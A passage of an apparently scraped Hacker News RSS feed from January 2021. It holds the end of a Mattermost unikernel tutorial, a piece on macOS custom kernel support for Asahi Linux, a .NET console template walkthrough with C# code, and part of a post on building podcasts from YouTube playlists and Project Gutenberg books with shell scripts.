{"level":"info","ts":1610387204.5032592,"caller":"filesstore/localstore.go:33","msg":"Able to write files to local storage."}
{"level":"info","ts":1610387204.7344124,"caller":"app/license.go:41","msg":"License key from https://mattermost.com required to unlock enterprise features."}
{"level":"info","ts":1610387204.982482,"caller":"app/migrations.go:26","msg":"Migrating roles to database."}
{"level":"info","ts":1610387208.7359424,"caller":"sqlstore/post_store.go:1277","msg":"Post.Message supports at most 16383 characters (65535 bytes)"}
{"level":"info","ts":1610387209.2314367,"caller":"app/migrations.go:102","msg":"Migrating emojis config to database."}
{"level":"info","ts":1610387246.2326972,"caller":"mlog/log.go:164","msg":"Starting up plugins"}
{"level":"info","ts":1610387246.241575,"caller":"app/server.go:213","msg":"Current version is 5.12.0 (5.12.0/Sat Jun 15 09:02:50 UTC 2019/bfd66aa445a2df8c6ed6b a9f2567021ecf6c9f3b/403add5df2a572f676fd9da85ad80623cb00b88a)"}
{"level":"info","ts":1610387246.2597792,"caller":"app/server.go:214","msg":"Enterprise Enabled: true"}
{"level":"info","ts":1610387246.267642,"caller":"app/server.go:216","msg":"Current working directory is /"}
{"level":"info","ts":1610387246.276085,"caller":"app/server.go:217","msg":"Loaded config","source":"file:///config/config.json"}
{"level":"info","ts":1610387246.9817462,"caller":"jobs/workers.go:68","msg":"Starting workers"}
{"level":"info","ts":1610387246.989871,"caller":"app/server.go:413","msg":"Starting Server..."}
{"level":"info","ts":1610387246.9986944,"caller":"app/server.go:479","msg":"Server is listening on [::]:8065"}
{"level":"info","ts":1610387247.0144029,"caller":"jobs/schedulers.go:72","msg":"Starting schedulers."}
{"level":"info","ts":1610387247.0446193,"caller":"app/web_hub.go:75","msg":"Starting 2 websocket hubs"}
</code></pre>

<p>If everything works you'll see the login/setup page for mattermost!</p>

            <center><img src="https://nanovms.com/static/dist/img/tutorials/mattermost.png"></center>

      </div></div>]]>
            </description>
            <link>https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792618</guid>
            <pubDate>Fri, 15 Jan 2021 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A flashcard deck for New Keynesian macroeconomics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792583">thread link</a>) | @mvind
<br/>
January 15, 2021 | https://memordo.com/app/public/325 | <a href="https://web.archive.org/web/*/https://memordo.com/app/public/325">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://memordo.com/app/public/325</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792583</guid>
            <pubDate>Fri, 15 Jan 2021 16:25:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS beta adds custom kernel support, closer to installing other OSS on M1 Macs]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25792565">thread link</a>) | @CharlesW
<br/>
January 15, 2021 | https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It’s an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you’re dedicated to reverse-engineer Apple’s software for Macs, it’s a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn’t originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, “the OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.” He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>— Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that’s specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-95278" data-id="95278" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/apple-store-goes-down-ahead-of-todays-mac-event/" title="Apple Store Down"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg" alt="Apple Store Down" srcset="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-293x293.jpg 293w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-724x724.jpg 724w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple’s VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, “that’s really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that’s a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.”</p>
<p>The newly added support for custom kernels on Big Sur’s 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we’ve noted before, Asahi Linux is an independent project that relies on people’s contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project’s Patreon</a> to expedite the development.</p>
<p>Let us know your thoughts about this story in the comments section below.</p>
</div></div>]]>
            </description>
            <link>https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792565</guid>
            <pubDate>Fri, 15 Jan 2021 16:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My preferred .NET console stack]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 104 (<a href="https://news.ycombinator.com/item?id=25792422">thread link</a>) | @devlead
<br/>
January 15, 2021 | https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack | <a href="https://web.archive.org/web/*/https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    │   MyConsoleApp.csproj
    │   Program.cs
    │
    └───Commands
        │   ConsoleCommand.cs
        │
        ├───Settings
        │       ConsoleSettings.cs
        │
        └───Validation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>
</blockquote>
<pre><code>using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Devlead.Console.Commands;
using Spectre.Console.Cli;
using Spectre.Cli.Extensions.DependencyInjection;

var serviceCollection = new ServiceCollection()
    .AddLogging(configure =&gt;
            configure
                .AddSimpleConsole(opts =&gt; {
                    opts.TimestampFormat = "yyyy-MM-dd HH:mm:ss ";
                })
    );

using var registrar = new DependencyInjectionRegistrar(serviceCollection);
var app = new CommandApp(registrar);

app.Configure(
    config =&gt;
    {
        config.ValidateExamples();

        config.AddCommand&lt;ConsoleCommand&gt;("console")
                .WithDescription("Example console command.")
                .WithExample(new[] { "console" });
    });

return await app.RunAsync(args);
</code></pre>
<h2 id="consolecommand.cs">ConsoleCommand.cs</h2>
<p><code>ConsoleCommand.cs</code> contains "just" your business code, <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> handles the heavy lifting of parsing and validating command-line arguments (<em>based on provided settings class, more on that later in the post.</em>), resolving constructor parameters using dependency injection, etc. Letting you focus on the domain and not the boilerplate code, resulting in a very similar experience to i.e. Azure Function or .NET Workers, enabling reuse of both patterns and code. <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> has support for both async and sync commands.</p>
<pre><code>using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyConsoleApp.Commands.Setting;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands
{
    public class ConsoleCommand : AsyncCommand&lt;ConsoleSettings&gt;
    {
        private ILogger Logger { get; }

        public override async Task&lt;int&gt; ExecuteAsync(CommandContext context, ConsoleSettings settings)
        {
            Logger.LogInformation("Mandatory: {Mandatory}", settings.Mandatory);
            Logger.LogInformation("Optional: {Optional}", settings.Optional);
            Logger.LogInformation("CommandOptionFlag: {CommandOptionFlag}", settings.CommandOptionFlag);
            Logger.LogInformation("CommandOptionValue: {CommandOptionValue}", settings.CommandOptionValue);
            return await Task.FromResult(0);
        }

        public ConsoleCommand(ILogger&lt;ConsoleCommand&gt; logger)
        {
            Logger = logger;
        }
    }
}
</code></pre>
<h2 id="consolesettings.cs">ConsoleSettings.cs</h2>
<p><code>ConsoleSettings.cs</code> contains the definition of what parameters each command has, if they're are mandatory/optional, positional and how they validated. It also contains metadata used for automatically generating help and error messages.</p>
<pre><code>using System.ComponentModel;
using Devlead.Console.Commands.Validate;
using Spectre.Console.Cli;

namespace Devlead.Console.Commands.Setting
{
    public class ConsoleSettings : CommandSettings
    {
        [CommandArgument(0, "&lt;mandatory&gt;")]
        [Description("Mandatory argument")]
        public string Mandatory { get; set; } = string.Empty;

        [CommandArgument(1, "[optional]")]
        [Description("Optional argument")]
        public string? Optional { get; set; }

        [CommandOption("--command-option-flag")]
        [Description("Command option flag.")]
        public bool CommandOptionFlag { get; set; }

        [CommandOption("--command-option-value &lt;value&gt;")]
        [Description("Command option value.")]
        [ValidateString]
        public string? CommandOptionValue { get; set; }
    }
}
</code></pre>
<h2 id="validatestringattribute.cs">ValidateStringAttribute.cs</h2>
<p><a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> can validate either by custom attributes on properties (<em>see <code>ConsoleSettings.CommandOptionValue</code> for an example of that</em>) or globally by overriding <code>Validate()</code> method on <code>CommandSettings</code>. The template ships with a sample <code>ValidateStringAttribute</code> that just validates the length of a string, but you can make it as advanced as you want.</p>
<pre><code>using Spectre.Console;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands.Validation
{
    public class ValidateStringAttribute : ParameterValidationAttribute
    {
        public const int MinimumLength = 3;

        public ValidateStringAttribute() : base(errorMessage: null)
        {
        }

        public override ValidationResult Validate(ICommandParameterInfo parameterInfo, object? value)
            =&gt; (value as string) switch {
                { Length: &gt;= MinimumLength }
                    =&gt; ValidationResult.Success(),

                { Length: &lt; MinimumLength }
                    =&gt; ValidationResult.Error($"{parameterInfo?.PropertyName} ({value}) needs to be at least {MinimumLength} characters long."),

                _ =&gt; ValidationResult.Error($"Invalid {parameterInfo?.PropertyName} ({value}) specified.")
            };
    }
}
</code></pre>
<h2 id="result">Result</h2>
<p><img src="https://cdn.devlead.se/clipimg-vscode/2021/01/15/devleadmyconsoleapp.gif?sp=rl&amp;st=2021-01-15T09:33:29Z&amp;se=2031-01-16T09:33:00Z&amp;sv=2019-12-12&amp;sr=b&amp;sig=fp8lXgfDwOgGkdK3cYm0fFojddT8ZEx7SJuiIMkIOW8%3D" alt="GIF animation of Console experience"></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code. There's a LOT more to <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> than command-line parsing, to I hight …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</a></em></p>]]>
            </description>
            <link>https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792422</guid>
            <pubDate>Fri, 15 Jan 2021 16:08:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make podcasts out of Project Gutenberg books with Mozilla's Text-to-Speech model]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792367">thread link</a>) | @whatrocks
<br/>
January 15, 2021 | https://www.charlieharrington.com/flow-and-creative-computing | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/flow-and-creative-computing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently watched Pixar's SOUL and I loved its depiction of being <em>in the zone</em>:</p>
<p><span>
      <span></span>
  <img alt="In the Zone" title="In the Zone" src="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png" srcset="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/222b7/zone.png 163w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/ff46a/zone.png 325w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png 650w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/e548f/zone.png 975w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/3c492/zone.png 1300w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/769f8/zone.png 1924w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>This is a beautiful, astrally-projected depiction of Mihaly Csikszentmihalyi's <em>flow</em> concept. For the unfamiliar, here's how Csikszentmihalyi describes flow, or <em>the optimal experience</em>:</p>
<blockquote>
<p>It is what the sailor holding a tight course feels when the wind whips through her hair, when the boat lunges through the waves like a colt -- sails, hull, wind, and sea humming a harmony that vibrates in the sailor's veins. It is what a painter feels when the colors on the canvas begin to set up a magnetic tension with each other, and a new <em>thing</em>, a living form, takes shape in front of the astonished creator.</p>
</blockquote>
<p>That sounds pretty good, right? Csikszentmihalyi contends that flow is how we humans can achieve happiness. And it's not something that's given; it's something we have to cultivate and grow and work towards. I cannot recommend his book enough.</p>
<p>Even better was SOUL's depiction of the non-flow state - the lost souls:</p>
<p><span>
      <span></span>
  <img alt="lost souls" title="lost souls" src="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg" srcset="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/d2f63/lost-souls.jpg 163w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/c989d/lost-souls.jpg 325w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg 650w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/7c09c/lost-souls.jpg 975w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/a2510/lost-souls.jpg 1000w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>Definitely been there. Usually its whenever I hear, "Can you see my screen?" These poor creatures wander the astral plane, lost and unhappy and unsure why.</p>
<p>Luckily, the movie tells us it's never too late, and I believe them.</p>
<p>So, how do we achieve flow?</p>
<p>It's the deliberate combination of skill meeting challenge. More from Csikszentmihalyi:</p>
<blockquote>
<p>The best moments usually occur when a person's body or mind is stretched to its limits in a voluntary effort accomplish something difficult and worthwhile.</p>
</blockquote>
<p>This post documents a legitimate flow experience I had last week that began with an observation about my podcast addiction.</p>
<h2>All My Best Friends are Podcasts</h2>
<p>Yes, that's a <a href="https://www.youtube.com/watch?v=Z_63ZZRLylE">Less Than Jake</a> reference. You're welcome, 8th-Grade Charlie.</p>
<p>And, if you're at all like 28th-Grade Charlie, then you're also helplessly addicted to podcasts.</p>
<p>I listen all the time -- while I'm washing dishes, folding laundry, performing my daily Amazon cardboard box cutting ritual, even taking showers. Carly doesn't understand it, and I certainly can't explain it.</p>
<p>Am I that afraid of silence? My own thoughts? Am I so lonely for friendship that I even found this evisceration quietly comforting?</p>
<blockquote><p lang="en" dir="ltr">Podcasts saying literally nothing for 20 minutes. <a href="https://t.co/nmfka1Gjsp">pic.twitter.com/nmfka1Gjsp</a></p>— Jonathan Ogden (@jogdenUK) <a href="https://twitter.com/jogdenUK/status/1346442437376552962?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote> 
<p>I know too much about ancient Rome to be able to answer these questions.</p>
<p>So, if I'm just going to accept my Overcast overlords, can I turn the tides on this one-directional relationship?</p>
<p>Yes. We can. Enter: the spark of an idea.</p>
<h2>Create a podcast from the audio of YouTube videos</h2>
<p>If I can't control what my favorite podcast hosts are talking about in any given episode, can I instead choose <em>exactly</em> what I want to listen to? What if there were a virtually unlimited source of content to consume? Surely, I could then be more deliberate in my listening habits.</p>
<p>YouTube is our answer. I've been collecting computer science talks and lectures in playlists that I always mean to "watch later" and never do. Fact is, I don't want to watch a YouTube video. I rarely ever sit down and "watch YouTube" (other than The 8-Bit Guy cleaning old VIC-20s). It's not part of my routine. I'm usually moving around too much.</p>
<p>YouTube also makes it really hard to consume something "on the go." You need to pay for their PiP or minimized mode, I think.</p>
<p>Then I found this <a href="https://benjamincongdon.me/blog/2020/03/02/Creating-a-Podcast-Feed-from-a-YouTube-Playlist/">post by Benjamin Congdon</a>: a simple way to create an audio podcast feed from a YouTube playlist using a <a href="https://amzn.to/3qksZiq">Raspberry Pi</a> home server. His tutorial leverages an open source project called <a href="https://github.com/mxpv/podsync/">PodSync</a>, which itself leverages <code>ffmpeg</code> and, everyone's favorite controversy, <code>youtube-dl</code>, behind the scenes to download audio from YouTube and generate a podcast RSS feed. This, this, is exactly what I was looking for!</p>
<p>Nothing to add here, other than bravo, Benjamin. I was able to follow his tutorial pretty much straight through.</p>
<p>Wait, I do have something to add. Benjamin suggests using <code>rsync</code> to upload your mp3s and xml RSS feed to s3 or the like. I did this initially, but I didn't like the idea of having to mark these files as <code>public</code> on s3 in case of some huge accidental traffic surge.</p>
<p>So I came up with another idea:</p>
<ul>
<li>Create a public repo on GitHub and enable GitHub Pages (mine is <a href="https://github.com/rockswhat/listener">here</a>)</li>
<li>Init the repo in your <code>/data</code> directory on the Raspberry Pi (this is the directory with the generated <code>.xml</code> RSS feed and <code>mp3</code> audio files)</li>
<li>Change your Podsync config's hostname to your GitHub Pages site: </li>
</ul>
<div data-language="text"><pre><code>hostname = "https://rockswhat.github.io/listener"`</code></pre></div>
<ul>
<li>Change your cron command to push to your repo (instead of <code>rsync</code> to s3):</li>
</ul>
<div data-language="text"><pre><code>*/15 * * * * cd /home/pi/podsync/data &amp;&amp; git add . &amp;&amp; git commit -m "update feed" &amp;&amp; git push origin main</code></pre></div>
<p>Voila! My own podcast feed of YouTube videos, publicly available on the Internet. You can add my feed to Overcast (or your favorite podcast player) with its XML URL:</p>
<div data-language="text"><pre><code>https://rockswhat.github.io/listener/listen_laterz.xml</code></pre></div>
<h3>C'mon, you really achieved flow from <em>that</em>?</h3>
<p>No, not really, but <em>almost</em>. Tutorials, good ones, at least, are guided paths toward some goal, with micro-feedback and mini-frustrations along the way. And these things are well-suited to flow. They can lead you to flow.</p>
<p>In my case, this tutorial got my gears turning. Which now gets us into to the <code>creative computing</code> side of this article.</p>
<p>I think it's important to remind ourselves to have fun with our computers. To use them to make art, make music, create weird stuff, just because we can. There's so much on our computers and phones now thanks to the Internet that can warp our minds and render us into Lost Souls. We often forget the simple joys of computers of the past, back when they were bicycles for the mind, and used adorable floppy disks or CD-ROM drives for games and encyclopedias. I know there's so much "more" that we can do with computers, but we need to remember that they are here to work for us, and not the other way around.</p>
<p>As soon as I saw Overcast fill up with audio from my <code>Listen Laterz</code> YouTube playlist, I knew I needed to keep going, to see what else I could render from clay into podcast feeds.</p>
<h2>Creating a podcast audiobook from Project Gutenberg e-books</h2>
<p>Where else can we find a giant repository of open content on the Internet that also happens to be inconvenient to consume?</p>
<p>Hello, <a href="https://www.gutenberg.org/">Project Gutenberg</a>! </p>
<p>Project Gutenberg is just about the coolest --- and one of the most important -- things on the internet. The fact that it was <a href="https://en.wikipedia.org/wiki/Project_Gutenberg">started on the ARPANET in 1971</a> blows my mind. That is some creative, forward-thinking from its founder Michael S. Hart.</p>
<p>My idea here is simple: pick a public domain book, chop it up into chapters, convert the chapters to audio, and then generate an xml RSS feed.</p>
<p>I picked Mary Shelley's <a href="https://www.gutenberg.org/files/84/84-h/84-h.htm">Frankenstein</a>, because, why not? I already read it a few years ago during my October "Spooky Reads" habit, but I figured it's the perfect candidate for re-animation.</p>
<p>If you've clicked the link to the text on Project Gutenberg, you'll see it's a plaintext nightmare. I'm not ashamed to admit here that I manually just chopped it up into separate text files, rather than writing a script to somehow do this for me. Whatever, ok?</p>
<p>First let's make some files.</p>
<div data-language="bash"><pre><code><span>cd</span> pieces
<span>touch</span> intro.txt
<span>touch</span> letter-<span>{</span><span>1</span><span>..</span><span>4</span><span>}</span>.txt
<span>touch</span> chapter-<span>{</span><span>1</span><span>..</span><span>24</span><span>}</span>.txt
<span>touch</span> license.txt</code></pre></div>
<p>And then we copy-pasta.</p>
<p>Now that I've got my chapters (aka future podcast episodes) all set, we're ready to convert them to audio. What's the easiest way I can do that?</p>
<p>My "in-the-zone" brain suggests using the terminal's <code>say</code> command. I've used this command a few years ago in one of my earliest creative computing projects: a <a href="https://www.charlieharrington.com/terminal-man-live-in-nyc">live musical performance from a telepresence robot</a>).</p>
<p>Surely, I can write a neat little script to loop through my text files and <code>say</code> them into an <code>mp3</code>. Some Googling for <a href="https://stackoverflow.com/questions/16501663/macs-say-command-to-mp3">advice</a>, and I've soon got this Bash script going:</p>
<div data-language="bash"><pre><code><span>for</span> <span>i</span> <span>in</span> *.txt<span>;</span>
<span>do</span>
    <span>echo</span> <span>"processing <span>$i</span>..."</span><span>;</span>
    <span>name</span><span>=</span><span><span>$(</span><span>echo</span> <span>"<span>$i</span>"</span> <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'.'</span><span>)</span></span>
    say -v Vicki -f <span>$i</span> -o aiff/<span>$name</span>.aiff
    lame -m m aiff/<span>$name</span>.aiff mp3/<span>$name</span>.mp3
    <span>rm</span> aiff/<span>$name</span>.aiff
<span>done</span></code></pre></div>
<p>And it works! Checkpoint reached! The <code>mp3</code> files are now sitting happily in their respective <code>/mp3</code> folder. I experience a fleeting moment of joy, and then immediately plunge into the next challenge: generating an XML feed.</p>
